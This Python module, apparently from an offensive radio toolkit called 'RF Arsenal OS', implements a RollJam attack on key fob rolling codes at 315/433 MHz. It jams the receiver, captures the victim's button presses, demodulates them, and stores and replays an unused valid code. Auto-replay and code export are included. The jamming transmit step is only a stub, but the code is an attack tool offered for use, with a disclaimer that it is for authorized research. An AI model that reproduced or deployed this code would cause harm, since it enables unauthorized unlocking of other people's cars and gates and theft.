#!/usr/bin/env python3
"""
RF Arsenal OS - RollJam Attack Module
Hardware: BladeRF 2.0 micro xA9

Proper RollJam implementation for rolling code systems:
- Simultaneous jamming and capture
- Rolling code storage
- Delayed replay
- Multi-code capture
- Supports common frequencies (315/433 MHz)

WARNING: This is for authorized security research only.
Unauthorized use is illegal.
"""

import logging
import numpy as np
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Tuple, Callable
from enum import Enum
from datetime import datetime
import threading
import queue
import time

logger = logging.getLogger(__name__)


class RollJamState(Enum):
    """RollJam attack states"""
    IDLE = "idle"
    JAMMING = "jamming"
    CAPTURING = "capturing"
    JAM_CAPTURE = "jam_and_capture"
    READY_REPLAY = "ready_to_replay"
    REPLAYING = "replaying"


class TargetProtocol(Enum):
    """Target rolling code protocols"""
    KEELOQ = "keeloq"              # Microchip KeeLoq
    HITAG2 = "hitag2"              # NXP HITAG2
    AUT64 = "aut64"                # NXP AUT64
    MEGAMOS = "megamos"            # EM Megamos Crypto
    DST40 = "dst40"                # Texas Instruments DST40
    GENERIC = "generic"            # Unknown/generic


@dataclass
class RollJamConfig:
    """RollJam configuration"""
    rx_frequency: int = 433_920_000    # Hz
    tx_frequency: int = 433_920_000    # Hz
    jam_frequency: int = 433_920_000   # Hz
    sample_rate: int = 2_000_000       # 2 MSPS
    bandwidth: int = 500_000           # 500 kHz
    rx_gain: int = 60
    tx_gain: int = 60
    jam_gain: int = 70                 # Higher for effective jamming
    jam_offset_hz: int = 50_000        # Offset from signal for selective jam
    protocol: TargetProtocol = TargetProtocol.KEELOQ
    auto_replay: bool = False          # Auto replay on second capture


@dataclass
class CapturedCode:
    """Captured rolling code"""
    code_id: str
    timestamp: str
    frequency: float
    raw_samples: np.ndarray
    demodulated_bits: List[int]
    protocol: TargetProtocol
    rssi: float
    used: bool = False
    replay_count: int = 0
    
    @property
    def bit_string(self) -> str:
        return ''.join(str(b) for b in self.demodulated_bits)


@dataclass
class RollJamSession:
    """RollJam attack session"""
    session_id: str
    start_time: str
    state: RollJamState
    codes_captured: int
    codes_used: int
    jam_duration_sec: float
    target_protocol: TargetProtocol
    success: bool = False


class RollJamAttacker:
    """
    RollJam Attack System
    
    The RollJam attack works by:
    1. Jamming the receiver while capturing the first code press
    2. Victim presses button again (thinking first didn't work)
    3. Capture second code while replaying first code
    4. Now attacker has an unused valid code
    
    Uses BladeRF full-duplex for simultaneous jam and capture.
    """
    
    # Common key fob frequencies
    FREQUENCIES = {
        'us': 315_000_000,
        'eu': 433_920_000,
        'jp': 315_000_000,
    }
    
    # Typical key fob signal parameters
    SIGNAL_PARAMS = {
        TargetProtocol.KEELOQ: {
            'bit_rate': 2000,           # bps
            'preamble_bits': 12,
            'code_bits': 66,            # 28-bit serial + 32-bit hopping + 6 func
            'modulation': 'ook',
        },
        TargetProtocol.HITAG2: {
            'bit_rate': 4000,
            'preamble_bits': 5,
            'code_bits': 48,
            'modulation': 'bpsk',
        },
        TargetProtocol.GENERIC: {
            'bit_rate': 2000,
            'preamble_bits': 10,
            'code_bits': 64,
            'modulation': 'ook',
        },
    }
    
    def __init__(self, hardware_controller=None):
        """
        Initialize RollJam attacker
        
        Args:
            hardware_controller: BladeRF hardware controller
        """
        self.hw = hardware_controller
        self.config = RollJamConfig()
        
        self.state = RollJamState.IDLE
        self.is_running = False
        self._attack_thread = None
        
        # Captured codes (ordered by capture time)
        self.captured_codes: List[CapturedCode] = []
        
        # Session tracking
        self._session: Optional[RollJamSession] = None
        self._jam_start_time: Optional[float] = None
        
        # Signal processing queues
        self._rx_queue = queue.Queue(maxsize=100)
        
        # Callbacks
        self._code_callback: Optional[Callable] = None
        
        logger.info("RollJam Attack System initialized")
    
    def configure(self, config: RollJamConfig) -> bool:
        """Configure RollJam attack"""
        self.config = config
        
        if self.hw:
            try:
                # Configure RX channel
                self.hw.set_frequency(config.rx_frequency, channel=0, direction='rx')
                self.hw.set_sample_rate(config.sample_rate)
                self.hw.set_bandwidth(config.bandwidth)
                self.hw.set_gain(config.rx_gain, channel=0, direction='rx')
                
                # Configure TX channel for replay
                self.hw.set_frequency(config.tx_frequency, channel=0, direction='tx')
                self.hw.set_gain(config.tx_gain, channel=0, direction='tx')
                
                # Configure jam channel (second TX or offset frequency)
                # For selective jamming, use slight frequency offset
                
                logger.info(f"RollJam configured: {config.rx_frequency/1e6:.3f} MHz")
                
            except Exception as e:
                logger.error(f"Configuration failed: {e}")
                return False
        
        return True
    
    def start_attack(self, callback: Optional[Callable] = None) -> bool:
        """
        Start RollJam attack
        
        Args:
            callback: Called when code is captured
            
        Returns:
            True if attack started
        """
        if self.is_running:
            logger.warning("Attack already running")
            return False
        
        logger.warning("=" * 50)
        logger.warning("STARTING ROLLJAM ATTACK")
        logger.warning("This attack is ILLEGAL without authorization!")
        logger.warning("Only use on systems you own or have permission to test.")
        logger.warning("=" * 50)
        
        self._code_callback = callback
        self.is_running = True
        self.state = RollJamState.JAM_CAPTURE
        self.captured_codes = []
        
        # Create session
        self._session = RollJamSession(
            session_id=f"rolljam_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
            start_time=datetime.now().isoformat(),
            state=self.state,
            codes_captured=0,
            codes_used=0,
            jam_duration_sec=0,
            target_protocol=self.config.protocol
        )
        
        self._jam_start_time = time.time()
        
        # Start attack thread
        self._attack_thread = threading.Thread(target=self._attack_worker, daemon=True)
        self._attack_thread.start()
        
        logger.info(f"RollJam attack started: {self._session.session_id}")
        return True
    
    def stop_attack(self) -> RollJamSession:
        """
        Stop attack
        
        Returns:
            Session results
        """
        self.is_running = False
        self.state = RollJamState.IDLE
        
        if self._attack_thread:
            self._attack_thread.join(timeout=2.0)
        
        if self._session:
            self._session.state = self.state
            self._session.codes_captured = len(self.captured_codes)
            self._session.codes_used = len([c for c in self.captured_codes if c.used])
            if self._jam_start_time:
                self._session.jam_duration_sec = time.time() - self._jam_start_time
            self._session.success = len(self.get_unused_codes()) > 0
        
        logger.info(f"RollJam stopped: {len(self.captured_codes)} codes captured")
        return self._session
    
    def _attack_worker(self):
        """Main attack worker - jam and capture simultaneously"""
        
        while self.is_running:
            try:
                # Simultaneous jam and capture using full-duplex
                
                # Generate jam signal (noise or shifted carrier)
                jam_samples = self._generate_jam_signal()
                
                # Start transmitting jam signal
                if self.hw:
                    # Would use separate TX channel or time-division
                    pass
                
                # Capture samples on RX
                samples = self._capture_samples(50000)
                
                # Detect key fob signal
                code = self._detect_code(samples)
                
                if code:
                    self.captured_codes.append(code)
                    self._session.codes_captured = len(self.captured_codes)
                    
                    logger.info(f"Code captured! Total: {len(self.captured_codes)}")
                    
                    if self._code_callback:
                        self._code_callback(code)
                    
                    # Auto-replay logic
                    if self.config.auto_replay and len(self.captured_codes) >= 2:
                        # We have 2 codes - replay the first one
                        self._do_auto_replay()
                
            except Exception as e:
                logger.error(f"Attack error: {e}")
    
    def _generate_jam_signal(self) -> np.ndarray:
        """Generate jamming signal"""
        num_samples = 10000
        
        # Options for jamming:
        # 1. Broadband noise
        # 2. Tone at offset frequency
        # 3. Modulated carrier
        
        # Using offset tone for selective jamming
        # This jams the receiver but allows us to capture at slightly different freq
        t = np.arange(num_samples) / self.config.sample_rate
        offset = self.config.jam_offset_hz
        
        # Jam signal: carrier at offset + some noise
        jam = np.exp(2j * np.pi * offset * t)
        jam += 0.1 * (np.random.randn(num_samples) + 1j * np.random.randn(num_samples))
        
        return jam * 0.9  # Scale to prevent clipping
    
    def _capture_samples(self, num_samples: int) -> np.ndarray:
        """Capture IQ samples"""
        if self.hw:
            return self.hw.receive(num_samples, channel=0)
        else:
            # Simulation
            return np.random.randn(num_samples) + 1j * np.random.randn(num_samples)
    
    def _detect_code(self, samples: np.ndarray) -> Optional[CapturedCode]:
        """Detect and decode key fob transmission"""
        
        # Calculate signal power
        power = np.abs(samples)**2
        mean_power = np.mean(power)
        
        # Threshold for signal detection
        threshold = mean_power * 10
        
        # Find signal presence
        signal_present = power > threshold
        
        if not np.any(signal_present):
            return None
        
        # Find signal boundaries
        start_idx = np.argmax(signal_present)
        end_idx = len(signal_present) - np.argmax(signal_present[::-1])
        
        if end_idx - start_idx < 100:  # Too short
            return None
        
        # Extract signal portion
        signal = samples[start_idx:end_idx]
        
        # Demodulate based on protocol
        params = self.SIGNAL_PARAMS.get(self.config.protocol, 
                                        self.SIGNAL_PARAMS[TargetProtocol.GENERIC])
        
        if params['modulation'] == 'ook':
            bits = self._demodulate_ook(signal, params['bit_rate'])
        elif params['modulation'] == 'fsk':
            bits = self._demodulate_fsk(signal, params['bit_rate'])
        else:
            bits = self._demodulate_ook(signal, params['bit_rate'])
        
        if len(bits) < params['code_bits'] // 2:
            return None  # Not enough bits
        
        # Calculate RSSI
        rssi = 10 * np.log10(np.mean(np.abs(signal)**2) + 1e-10)
        
        # Create captured code
        code = CapturedCode(
            code_id=f"code_{len(self.captured_codes)+1}_{datetime.now().strftime('%H%M%S')}",
            timestamp=datetime.now().isoformat(),
            frequency=self.config.rx_frequency / 1e6,
            raw_samples=signal,
            demodulated_bits=bits,
            protocol=self.config.protocol,
            rssi=rssi
        )
        
        return code
    
    def _demodulate_ook(self, samples: np.ndarray, bit_rate: int) -> List[int]:
        """Demodulate OOK signal"""
        # Calculate envelope
        envelope = np.abs(samples)
        
        # Samples per bit
        spb = int(self.config.sample_rate / bit_rate)
        
        # Threshold
        threshold = (np.max(envelope) + np.min(envelope)) / 2
        
        # Extract bits
        bits = []
        for i in range(0, len(envelope) - spb, spb):
            bit_samples = envelope[i:i+spb]
            bit = 1 if np.mean(bit_samples) > threshold else 0
            bits.append(bit)
        
        return bits
    
    def _demodulate_fsk(self, samples: np.ndarray, bit_rate: int) -> List[int]:
        """Demodulate FSK signal"""
        # FM demodulation
        phase = np.unwrap(np.angle(samples))
        freq = np.diff(phase)
        
        # Samples per bit
        spb = int(self.config.sample_rate / bit_rate)
        
        # Extract bits
        bits = []
        for i in range(0, len(freq) - spb, spb):
            bit_samples = freq[i:i+spb]
            bit = 1 if np.mean(bit_samples) > 0 else 0
            bits.append(bit)
        
        return bits
    
    def _do_auto_replay(self):
        """Automatically replay first code when second is captured"""
        unused = self.get_unused_codes()
        if unused:
            self.replay_code(unused[0].code_id)
    
    def replay_code(self, code_id: str) -> bool:
        """
        Replay a captured code
        
        Args:
            code_id: ID of code to replay
            
        Returns:
            True if replayed successfully
        """
        # Find code
        code = None
        for c in self.captured_codes:
            if c.code_id == code_id:
                code = c
                break
        
        if not code:
            logger.error(f"Code not found: {code_id}")
            return False
        
        logger.warning(f"Replaying code: {code_id}")
        
        # Stop jamming during replay
        old_state = self.state
        self.state = RollJamState.REPLAYING
        
        # Transmit the raw samples
        if self.hw:
            # Configure TX
            self.hw.set_frequency(self.config.tx_frequency, channel=0, direction='tx')
            self.hw.transmit(code.raw_samples, channel=0)
        
        # Mark code as used
        code.used = True
        code.replay_count += 1
        
        # Restore state
        self.state = old_state
        
        logger.info(f"Code {code_id} replayed successfully")
        return True
    
    def get_unused_codes(self) -> List[CapturedCode]:
        """Get codes that haven't been replayed"""
        return [c for c in self.captured_codes if not c.used]
    
    def get_all_codes(self) -> List[CapturedCode]:
        """Get all captured codes"""
        return self.captured_codes
    
    def export_codes(self, filepath: str) -> bool:
        """
        Export captured codes to file
        
        Args:
            filepath: Output file path
            
        Returns:
            True if exported
        """
        try:
            with open(filepath, 'w') as f:
                for code in self.captured_codes:
                    f.write(f"# Code: {code.code_id}\n")
                    f.write(f"# Time: {code.timestamp}\n")
                    f.write(f"# Freq: {code.frequency} MHz\n")
                    f.write(f"# RSSI: {code.rssi:.1f} dBm\n")
                    f.write(f"# Used: {code.used}\n")
                    f.write(f"{code.bit_string}\n\n")
            
            logger.info(f"Exported {len(self.captured_codes)} codes to {filepath}")
            return True
            
        except Exception as e:
            logger.error(f"Export failed: {e}")
            return False
    
    def get_status(self) -> Dict:
        """Get attacker status"""
        return {
            'state': self.state.value,
            'running': self.is_running,
            'protocol': self.config.protocol.value,
            'frequency_mhz': self.config.rx_frequency / 1e6,
            'codes_captured': len(self.captured_codes),
            'codes_unused': len(self.get_unused_codes()),
            'jam_duration_sec': time.time() - self._jam_start_time if self._jam_start_time else 0,
        }


def get_rolljam_attacker(hardware_controller=None) -> RollJamAttacker:
    """Get RollJam attacker instance"""
    return RollJamAttacker(hardware_controller)
